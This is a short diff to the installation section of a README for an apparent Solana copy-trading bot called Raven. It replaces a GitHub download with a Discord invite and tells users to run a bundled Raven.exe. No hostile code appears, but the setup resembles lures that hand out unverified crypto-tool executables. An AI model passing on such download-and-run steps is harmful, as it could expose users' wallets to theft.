@@ -31,16 +31,15 @@ Optimized for Solana → Adjustable Jito fees, lamports management, and custom R
 
 # Installation
 
-Download the file from the GitHub repository.
-    
+Join our Discord to download the latest version: https://discord.gg/kx9EGMbctT.
+
 Extract the archive – everything is ready, the executable is included.
-    
+
 Run the executable (Raven.exe) and configure your settings directly via the interface.
     
 
 For more details, visit the # GitHub: https://raven-bot-1.gitbook.io/raven-bot-swift-and-smart-copy-trading
 
-Join the # Discord community: https://discord.gg/kx9EGMbctT
 
 
 
